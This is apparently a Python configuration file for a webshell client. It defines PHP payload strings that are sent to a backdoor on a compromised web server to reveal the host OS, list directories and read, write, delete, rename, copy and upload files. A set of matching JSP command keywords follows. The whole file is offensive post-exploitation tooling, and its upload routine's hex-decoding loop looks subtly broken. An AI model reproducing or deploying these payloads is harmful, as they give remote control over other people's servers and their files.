PHP_fileBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
PHP_GETDIR = '''@@$handle=opendir('.');\
        echo "\n目录:----------------------\n";\
        while($file = readdir($handle)){echo "$file\n";}closedir($handle);'''
PHP_GETPATH = '''@@echo getcwd();'''
PHP_MKDIR = '''@@if(mkdir("##/")){echo 'done';}else{echo 'something err';}'''
PHP_RMDIR = '''@@if(rmdir("##/")){echo 'done';}else{echo 'something err';}'''
PHP_CD = '''@@'''
PHP_CHDIR = '''chdir("##");'''
PHP_READ = '''@@$ff=fopen("##","r");if(!$ff){echo "<br />加载失败 或无此文件<br />";\
        exit;}while(!feof($ff)){echo fgets($ff,256);}fclose($ff);'''
PHP_WRITE ='''@@$file="#1";$strtofile="#2";$ff=fopen($file, "w");if($ff){echo 'done';\
        fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
PHP_WRITETO = '''@@if(file_put_contents("#1","#2",FILE_APPEND)){echo "done";}else{echo "something err";}'''
PHP_MKFILE = '''@@$file="##";$ff=fopen($file, "w");if($ff){echo 'done';}\
        else{echo 'something err';}fclose($ff);'''
PHP_DELETE = '''@@if(unlink("##")){echo 'done';}else{echo 'something err';}'''
PHP_RENAME = '''@@if(rename("#1","#2")){echo 'done';}else{echo 'something err';}'''
PHP_COPY = '''@@if(copy("#1","#2")){echo 'done';}else{echo 'something err';}'''

# PHP_UPLOAD ='''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);\
#         @@$file="#1";$strtofile=$POST["uploadDate"];if($strtofile!=null){echo $strtofile;$ff=fopen($file, "wb");\
#         if($ff){echo 'done';fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);die();}'''
# PHP_UPLOAD ='''@@$file="#1";$strtofile="#2";echo $strtofile;$ff=fopen($file, "wb");if($ff){echo 'done';\
#         fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
PHP_UPLOAD='''@ini_set("display_errors","0");@set_time_limit(0);@ini_set("set_magic_quotes_runtime","0");\
        $f=$_POST["z1"];$c=$_POST["z2"];$c=str_replace("\r","",$c);\
        $c=str_replace("\n","",$c);$buf="";\
        for($i=0;$i<strlen($c);$i+=2)$buf.=substr($c,$i,2);\
        echo(@fwrite(fopen($f,"w"),$buf)?"done!":"false!");die();'''

##################################################################################################

JSP_fileBaseCode='''uname'''
JSP_GETDIR = '''dir'''
JSP_GETPATH = '''pwd'''
JSP_MKDIR = '''mkdir'''
JSP_RMDIR = '''rmdir'''
JSP_CD = '''CD'''
JSP_CHDIR = '''changepath'''
JSP_READ = '''read'''
JSP_WRITE ='''write'''
JSP_WRITETO = '''writeto'''
JSP_MKFILE = '''mkfile'''
JSP_DELETE = '''delete'''
JSP_RENAME = '''rename'''
JSP_COPY = '''copy'''
JSP_UPLOAD ='''upload'''